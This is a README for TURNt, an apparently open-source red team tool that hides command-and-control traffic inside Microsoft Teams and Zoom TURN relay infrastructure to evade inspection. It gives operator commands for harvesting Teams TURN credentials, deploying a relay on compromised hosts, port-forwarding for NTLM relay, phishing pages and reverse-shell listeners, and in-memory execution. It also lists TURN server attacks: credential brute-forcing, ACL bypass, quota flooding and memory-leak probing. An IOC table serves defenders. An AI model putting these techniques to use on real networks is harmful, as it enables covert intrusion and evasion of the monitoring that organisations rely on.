# 🚀 TURNt

TURNt (TURN tunneler) is a red team tool designed for one-off interactive command and control communications along-side an existing implant providing a long-term command and control connection. TURNt allows an operator to tunnel interactive command and control traffic such as hidden VNC and SOCKS traffick over legitimate meeting protocols used by web conferencing software such as Zoom or Microsoft Teams.

<p align="center">
  <img alt="logo" src="https://github.com/user-attachments/assets/d4411383-38df-4cb5-ba31-b2e59366aa6c" />
</p>

# 📚 Table of Contents

- [🧩 What problem does this solve?](#what-problem-does-this-solve)
- [🔍 How Does It Work?](#-how-does-it-work)
- [📦 Installation](#-installation)
  - [🔧 Building from Source](#-building-from-source)
- [📝 Usage Guide](#-usage-guide)
  - [Step 1: Obtain TURN Credentials](#step-1-obtain-turn-credentials)
  - [Step 2: Start the Controller](#step-2-start-the-controller)
  - [Step 3: Start the Relay](#step-3-start-the-relay)
  - [Step 4: Configure Your Applications](#step-4-configure-your-applications)
- [🔄 Port-Forwarding with `turnt admin`](#-port-forwarding-with-turnt-admin)
  - [🔧 Usage](#-usage)
  - [📘 Example](#-example)
  - [🔍 Local and Remote Port-Forwarding Examples](#-local-and-remote-port-forwarding-examples)
  - [🛠 Use Cases](#-use-cases)
  - [⚠️ Limitations](#️-limitations)
- [🔒 TURN Server Auditing with `turnt audit`](#-turn-server-auditing-with-turnt-audit)
- [⚠️ SOCKS Proxy Usage Notes](#️-socks-proxy-usage-notes)
  - [Things to Avoid](#things-to-avoid)
  - [Known Issues](#known-issues)
- [🚦 Transport Considerations](#-transport-considerations)
  - [🧃 SCTP over TCP: Practical Implications](#-sctp-over-tcp-practical-implications)
  - [📡 Connection Stability is Critical](#-connection-stability-is-critical)
- [✅ Supported Features](#-supported-features)
- [🎥 Web Conferencing Providers](#-web-conferencing-providers)
- [💳 Other Paid Providers](#-other-paid-providers)
- [🕵️ Indicators of Compromise (IOCs)](#-indicators-of-compromise-iocs)
- [🧠 Advanced Usage with NightHawk](#-advanced-usage-with-nighthawk)

# 🧩 What problem does this solve?

Many traditional covert command and control channels suffer from speed and detection issues. TURNt addresses key challenges in red team operations:

* ⚡ **Slow and Bottlenecked C2 Channels:** ❌ Many modern C2 channels—such as those leveraging Microsoft Teams, Slack, or other chat-based exfiltration techniques—are not optimized for high-bandwidth, low-latency operations. These channels often introduce delays and limit interactive capabilities, making them impractical for tasks requiring real-time responsiveness. ✅ **TURNt** enables real-time interactive sessions, making C2 operations much more responsive.
* 🎭 **Deep Packet Inspection (DPI) Evasion:** 🛡️ Standard C2 channels are increasingly scrutinized by security tools. Even encrypted traffic can be identified based on behavioral patterns, requiring more sophisticated evasion techniques.
* 📈 **Traffic Anomaly Detection:** 🚨 Many C2 channels stand out due to high request frequency—such as tens of thousands of requests to a single domain or endpoint in a short period—which can trigger anomaly detection systems and lead to blocking.
* 🔁 **Legitimate Protocol Reuse:** 💬 Web conferencing services generate large volumes of UDP and TCP traffic across diverse hosts, making them ideal for blending in and bypassing network monitoring tools.
* 🌐 **Resilient Infrastructure:** 🛰️ Web conferencing providers use globally distributed TURN servers and robust networking to ensure high availability and quality of service, making it difficult for defenders to isolate and block malicious traffic.

# 🔍 How Does It Work?

TURNt provides a unified CLI (`turnt`) and a standalone relay binary (`turnt-relay`) that enable tunneling arbitrary traffic through TURN servers hosted by third-party web conferencing providers such as Zoom or Microsoft Teams. This allows interactive command-and-control traffic to be relayed through trusted infrastructure that is often exempt from deep inspection by security tools due to high traffic volume and vendor-recommended allowlisting. 

TURN (Traversal Using Relays around NAT) is commonly used in web conferencing to facilitate connectivity between clients when direct peer-to-peer communication is blocked by NAT or firewall configurations. When a client cannot establish a UDP connection to a media server due to restrictive egress controls, it can instead proxy its traffic through a TURN server — typically over TCP or TLS — to bypass these restrictions. 

In particular, many TURN servers are configured to accept connections on port 443 using TURNS (TURN over TLS over TCP), allowing traffic to blend in with standard HTTPS flows. This provides an effective channel for covert tunneling, leveraging infrastructure that is often assumed to be benign.

# 📦 Installation

Installation is simple as all components are written in Go and ship as standalone binaries with no external dependencies. To get started quickly, visit the [Releases tab](../../releases) where you'll find prebuilt binaries for major platforms, including UPX-compressed versions if minimizing binary size is important.

TURNt ships as two binaries:
- **`turnt`** — The operator CLI with subcommands for credentials, control, admin, and audit
- **`turnt-relay`** — The lightweight relay agent deployed on target systems

> ⚠️ **Platform Support Note**: While `turnt-relay` is fully supported on Windows, Linux, and macOS, the `turnt` operator CLI is only supported on Linux and macOS. This is due to Windows terminal limitations that prevent the handling of long base64-encoded strings required for the TURN tunnel handshake. For Windows environments, we recommend using `turnt-relay` to relay traffic through a compromised Windows host, while running the `turnt` CLI on a Linux or macOS system.

## 🔧 Building from Source

This section outlines how to build the binaries from source. While this can be useful for development purposes, we recommend using the pre-built UPX-packed binaries available in the Releases tab for production use. The build process is simple and straightforward. Since the underlying WebRTC library is a pure Go implementation, there are no external dependencies or CGO-related complications to worry about. To build from source, simply clone the repository and compile the required binaries:

```bash
git clone https://github.com/praetorian-inc/turnt.git
cd turnt

# Build the operator CLI (credentials, control, admin, audit)
go build -o turnt ./cmd/turnt

# Build the relay (lightweight agent deployed on target systems)
go build -o turnt-relay ./cmd/relay
```

# 📝 Usage Guide

This section walks through how to use TURNt to establish a SOCKS5 tunnel over Microsoft Teams TURN infrastructure. The process involves four main steps: obtaining TURN credentials, starting the controller, starting the relay, and configuring your applications to use the SOCKS proxy. While the underlying mechanics involve WebRTC, DTLS, and TURN, the tooling abstracts away the complexity, allowing for a simple copy-paste workflow using base64-encoded offers and answers. This guide assumes you've already built the binaries or downloaded them from the Releases tab.

### Step 1: Obtain TURN Credentials

The `turnt credentials` subcommand can be leveraged to obtain TURN server credentials from Microsoft Teams. These credentials can then be leveraged by the controller in order to establish a tunnel with the relay for SOCKS proxying. The command will save the credentials to `config.yaml` by default in the current directory. You can specify a different output file using the `-o` or `--output` flag. Below is an example command being used to generate MSTeams TURN server credentials and save them to the msteams_credentials.yaml file.

```bash
turnt credentials msteams -o msteams_credentials.yaml
```

### Step 2: Start the Controller

The controller component is used by the attacker and runs a SOCKS proxy service upon connecting to the relay. The following command can be used to initiate the controller. It will generate a base64-encoded blob that must be passed to the relay and then wait for a base64-encded blob from the relay to establish the connection. This is due to requirements of WebRTC and the TURN protocol. However, instead of using a centralized attacker-controlled relay server to establish the connection we simply leverage an existing implant or C2 connection to pass these values between the controller and the relay.

> ⚠️ **Windows Limitation**: The `turnt` operator CLI is not supported on Windows due to terminal limitations that prevent operators from pasting the base64-encoded answer into the terminal. We recommend using Linux or macOS for running the operator CLI.

The following command can be leveraged to start a controller instance with the credentials file generated in the previous step:

```bash
turnt control --config config.yaml
```

Additional options:
- `--socks`: Specify SOCKS5 server address (default: 127.0.0.1:1080)
- `-v, --verbose`: Enable verbose logging

The controller will generate a base64-encoded offer payload. Copy this payload as you'll need it for the relay.

### Step 3: Start the Relay

On the client machine, start the relay with the offer payload:

```bash
turnt-relay -offer "<base64_encoded_offer>"
```

Additional options:
- `-verbose`: Enable verbose logging

The relay will generate a base64-encoded answer. Copy this answer and paste it back into the controller's terminal.

### Step 4: Configure Your Applications

Once the connection is established, you can configure your applications to use the SOCKS5 proxy at `127.0.0.1:1080`.

```bash
curl -v --socks5 localhost:1080 http://example.com
```

## 🔄 Port-Forwarding with `turnt admin`

In addition to SOCKS5 proxying, TURNt ships with an interactive **Admin Console** (`turnt admin`) that lets operators create and manage **local** and **remote** port‑forwards over an active TURN tunnel. The console connects to the controller's built‑in QUIC admin interface (listening on `localhost:1337/UDP` by default) and exposes a simple shell for issuing port‑forward commands.

> ⚠️ **Note**: Only TCP forwarding is supported at this time. Forward listeners bind to **all** interfaces (`0.0.0.0`) and this cannot be configured yet.

### 🔧 Usage

```bash
# Start the console (assumes turnt control is running locally)
turnt admin
```

You should see something similar to:

```
2025/04/23 17:57:24 [INFO] Connecting to admin server at localhost:1337
2025/04/23 17:57:24 [INFO] Connected to admin server
TURNt Admin Console
Type 'help' for available commands
Type 'exit' to quit
>
```

Type `help` to display the full command set:

```
Available commands:
  lportfwd add <local_port> <remote_ip>:<remote_port>  - Add a new local port forward
  lportfwd remove <local_port>                          - Remove a local port forward
  lportfwd list                                         - List all local port forwards
  rportfwd add <port> <target>                          - Add a new remote port forward
  rportfwd remove <port>                                - Remove a remote port forward
  rportfwd list                                         - List all remote port forwards
  exit                                                  - Exit the admin console
```

### 📘 Example

Forward a remote RDP service (`192.168.1.38:3389`) to your local port **13389**:

```
> lportfwd add 13389 192.168.1.38:3389
```

You can now open an RDP client and connect to `localhost:13389` as if the host were on your local network.

### 🔍 Local and Remote Port-Forwarding Examples

Local port-forwarding allows you to expose a service on your local machine to the remote network through the TURN tunnel. This is useful for hosting services that need to be accessed by systems on the remote network.

> 💡 **Tip**: See [docs/rdp.md](docs/rdp.md) for a detailed guide on using local port-forwarding to access internal systems via RDP.

#### Testing with a Python HTTP Server

A quick way to test both local and remote port-forwarding is using Python's built-in HTTP server:

1. **Start a Python HTTP server on your local machine**:
   ```bash
   python3 -m http.server 8080
   ```

2. **For remote port-forwarding** - Expose your local server to the remote network:
   ```
   > rportfwd add 8888 127.0.0.1:8080
   ```
   This opens port 8888 on the remote machine and forwards all connections back to your local Python server.
   
   Any system on the remote network can now browse to `http://<relay-ip>:8888` and access your local web server.

> 💡 **Red Team Use Cases**: Remote port-forwarding is particularly valuable for offensive operations like NTLM relay attacks, hosting internal phishing pages, setting up listeners for reverse shells from other compromised systems, or exposing C2 infrastructure to internal targets.

4. **For local port-forwarding** - Access a remote web server locally:
   ```
   > lportfwd add 8888 192.168.1.100:8080
   ```
   Now you can browse to `http://localhost:8888` to access the web server running on the remote host.

### 🛠 Use Cases

- **Remote Desktop Access** – RDP / VNC
- **Web Access** – view internal web applications
- **SSH Forwarding** – interact with internal Linux hosts
- **Reverse Port‑Forwarding** – expose services back to the relay using `rportfwd`

### ⚠️ Limitations

| Limitation | Details | Recommendation |
|------------|---------|----------------|
| TCP only | Forwarding is limited to TCP streams. UDP & IPv6 are not yet supported. | Open an issue if you need UDP support. |
| Binds to all interfaces | Listeners bind to `0.0.0.0`; custom bind addresses are not currently configurable. | Use host‑based firewall rules to restrict access. |
| No authentication | No built‑in authentication is implemented. Restrict access to trusted hosts. |

## 🔒 TURN Server Auditing with `turnt audit`

TURNt includes a built-in security audit tool for assessing TURN/STUN server configurations. The `turnt audit` subcommand provides 8 assessment modules covering fingerprinting, authentication testing, relay scope assessment, ACL bypass verification, and protocol-level attacks.

```bash
# Fingerprint a TURN server
turnt audit -s turn.example.com:3478 info

# Test authentication requirements
turnt audit -s turn.example.com:3478 auth

# Test with credentials
turnt audit -s turn.example.com:3478 -u myuser -w mypass auth

# Brute-force credentials
turnt audit -s turn.example.com:3478 brute -U admin -W wordlist.txt

# Scan relay scope (what internal addresses are reachable)
turnt audit -s turn.example.com:3478 -u myuser -w mypass scan

# Test ACL bypass via IPv4-mapped IPv6 (CVE-2026-27624)
turnt audit -s turn.example.com:3478 -u myuser -w mypass bypass

# Test allocation quota enforcement
turnt audit -s turn.example.com:3478 -u myuser -w mypass flood

# Test for memory disclosure via malformed TLV
turnt audit -s turn.example.com:3478 -u myuser -w mypass memoryleak

# Measure STUN amplification ratio
turnt audit -s turn.example.com:3478 amplify
```

| Subcommand | Description |
|:----------:|:------------|
| `info` | Fingerprint server software, realm, nonce, and enumerate supported transports (UDP/TCP/TLS) |
| `auth` | Test whether the server requires authentication; validate provided credentials |
| `brute` | Dictionary attack against TURN credentials with configurable thread count |
| `scan` | Probe relay scope by sending CreatePermission for RFC1918, loopback, cloud metadata, and custom targets |
| `bypass` | Test ACL bypass using alternative address encodings (IPv4-mapped IPv6, zero addresses, IPv6 loopback) |
| `flood` | Create allocations until quota is reached to test per-user/total quota enforcement |
| `memoryleak` | Send malformed TLV attributes to detect Heartbleed-like memory disclosure |
| `amplify` | Measure STUN amplification ratio for reflection attack assessment |

## ⚠️ SOCKS Proxy Usage Notes

### Things to Avoid

| Action | Why It's a Problem | Recommended Alternative |
|--------|--------------------|--------------------------|
| Using speedtest websites (e.g., fast.com) | These flood the TCP stream and connection pool, potentially breaking the SOCKS proxy. | Use static test files like [Hetzner's 1GB test file](https://speed.hetzner.de/1GB.bin) to check speeds. |
| Using proxychains with port scanners | Quickly exhausts the connection pool, leading to false positives/negatives due to SOCKS connection limits. | Avoid scanning through the proxy, or use a lower concurrency setting. |
| Starting large downloads then trying to open other connections | TCP head-of-line blocking can impact performance, despite SCTP flow control. | Stagger high-bandwidth activities to reduce contention on the shared TCP stream. |

### Known Issues

|     **Issue**     |     **Details**     |
|:-----------------:|---|
| Head-of-line blocking | Due to the layered design (e.g., TURN over TCP over TLS), all traffic ultimately tunnels through a single TCP connection, which inherently introduces head-of-line blocking. While we use SCTP over WebRTC data channels to segment each proxied connection — allowing SCTP's flow control to help mitigate contention — it's not a complete solution. This is a known limitation of using reliable transports like TCP for multiplexed traffic. |
| No SOCKS authentication | The SOCKS proxy currently does **not** implement any authentication or access controls. Avoid exposing it to untrusted networks or the public internet without additional safeguards. |

## 🚦 Transport Considerations

When using TURNt for SOCKS5 proxying, your **local connection quality** and the **type of traffic you route through the proxy** can significantly affect performance. TURNt tunnels connections over **SCTP (Stream Control Transmission Protocol)** on top of **TCP/TLS** via WebRTC. This architecture avoids the classic TCP-over-TCP pitfalls, but does inherit some limitations from layering everything over a single TCP stream.

### 🧃 SCTP over TCP: Practical Implications

TURNt uses SCTP to multiplex multiple SOCKS5 connections efficiently, avoiding the worst behaviors of tunneling raw TCP over TCP. However, since all SCTP streams ride over a single TCP connection to the TURN server, there are a few inherent tradeoffs:

- **Head-of-line blocking:** Packet loss in the underlying TCP stream can delay all active SOCKS5 connections.
- **Shared congestion window:** Bandwidth-heavy tasks (like downloads or screen sharing) can affect the performance of lighter, latency-sensitive streams.
- **Concurrency pressure:** Parallel high-throughput applications may saturate the session and degrade overall responsiveness.

✅ **Recommendation:** General-purpose web browsing, API usage, or accessing internal sites via the SOCKS proxy works well. Problems typically arise when you route **multiple high-bandwidth flows concurrently**, such as parallel file downloads or scanners. Stagger or isolate such operations to avoid performance drops.

### 📡 Connection Stability is Critical

TURNt operates in a **"pidgin mode" signaling model** — meaning it relies on manual out-of-band coordination to establish a tunnel, without a persistent centralized signaling server. As a result:

- **WebRTC sessions are fragile:** If your connection drops, the SCTP-over-TURN tunnel is likely to break and cannot automatically recover.
- **No reconnection logic:** Since TURNt does not implement signaling server logic, you'll need to re-initiate the handshake manually if the tunnel is interrupted.

✅ **Recommendation:**
- Use stable, wired connections whenever possible.
- Avoid mobile or congested Wi-Fi networks during sensitive sessions.
- Be aware that unexpected disconnections will require you to restart the controller/relay handshake process.


## ✅ Supported Features

The following is a list of supported features for the SOCKS proxying functionality and what features are planned versus not planned for the various release stages:

|     **Feature**     |     **Status**     | **Notes** |
|:-------------------:|:------------------:|:--|
| TCP connection tunneling | ✅&nbsp;Supported | Fully functional — all proxied traffic is tunneled over TCP. |
| Remote DNS resolution through the SOCKSv5 proxy | ✅&nbsp;Supported | DNS resolution is performed on the relay side to ensure proper resolution in the target network. |
| UDP connection tunneling | ❌&nbsp;Not&nbsp;supported | Currently no plans to support UDP traffic tunneling. Please let us know if this would be useful and we can prioritize support. |
| IPv6 support | ❌&nbsp;Not&nbsp;supported | All connections must use IPv4 for now. |

## 🎥 Web Conferencing Providers

During our research we focused on the following web-conferencing providers:

|       Provider       |     Status      | Notes |
|:--------------------:|:--------------:|-------|
| Microsoft&nbsp;Teams | ✅&nbsp;Supported | Credentials can be fetched using `turnt credentials msteams`. |
| Zoom                 | 🔒&nbsp;[Patched](docs/zoom.md)   | Zoom has since patched the technique we documented. Fully documented but requires manual steps in Burp Suite to obtain the TURN credentials from the webclient. |
| Cisco&nbsp;WebEx     | 🔍&nbsp;Researching | We found a method to extract TURN credentials from WebEx; however, we were unable to get them working. Further investigation is needed, so this effort is deferred to a later date. |
| Google&nbsp;Meet     | ❌&nbsp;Not&nbsp;Planned | Currently out of scope for this project. |
| Slack&nbsp; | ❌&nbsp;Not&nbsp;Planned | Slack uses the Amazon Chime SDK (not to be confused with the deprecated Chime web app) to power features like Huddles. From our initial analysis, an attacker could provision their own Chime SDK application and relay traffic through Chime TURN servers. We believe this would closely resemble legitimate Slack traffic at the network level. At the moment, we are not planning on implementing support for this into the TURNt tooling, however, it would be a welcome contribution. |

## 💳 Other Paid Providers

These providers offer commercial TURN services that are not currently supported by `turnt credentials`, but may be worth researching further if you're looking for easier, more persistent TURN credentials via a paid option.

|     **Provider**     |     **Status**     | **Notes** |
|:--------------------:|:------------------:|:--|
| [Twilio](https://www.twilio.com/en-us/stun-turn) | ❌&nbsp;Not&nbsp;Planned | Twilio offers a [STUN/TURN service](https://www.twilio.com/en-us/stun-turn) that can be used with your own apps. Credentials must be provisioned manually. |
| [Cloudflare](https://developers.cloudflare.com/calls/turn/) | ❌&nbsp;Not&nbsp;Planned | Cloudflare offers TURN support via [Cloudflare Calls](https://developers.cloudflare.com/calls/turn/). Useful for paid setups, but not integrated into this tooling yet. |

## 🕵️ Indicators of Compromise (IOCs)

The following table outlines common domains, IP ranges, and patterns associated with TURN traffic used by supported and planned web conferencing providers. This information is useful for both operators who want to understand how well their traffic blends in, and defenders seeking to validate detections in test environments.

| **Provider**        | **Domain Patterns / Hosts**                                                                                      | **Notes** |
|:-------------------:|------------------------------------------------------------------------------------------------------------------|:--|
| **Microsoft&nbsp;Teams** | `*.relay.teams.microsoft.com`<br>`worldaz-msit.relay.teams.microsoft.com`                                          | Microsoft uses geographically distributed TURN servers. Connections often originate from Teams client regions. |
| **Zoom**            | `*.cloud.zoom.us`<br>`turnsg01.cloud.zoom.us`<br>`turnsg02.cloud.zoom.us` | Zoom has regional TURN endpoints used during meetings. TLS inspection may reveal Zoom-specific certs. |

## 🧠 Advanced Usage with NightHawk

Looking to deploy TURNt in stealthy environments using NightHawk? We’ve got you covered.

The TURNt toolkit has been tested and adapted to run cleanly through in-memory execution on beacon hosts using NightHawk. For detailed instructions on executing `turnt-relay` in memory, managing output files, and handling TURN offer/answer coordination, check out the full NightHawk guide:

📘 [Using TURNt with NightHawk In-Memory Execution Capability](docs/nighthawk.md)

This document includes:
- Controller/relay coordination via manual TURN signaling
- In-memory execution quirks and UPX recommendations
- Task management (`list-tasks`, `cancel-task`) and troubleshooting tips
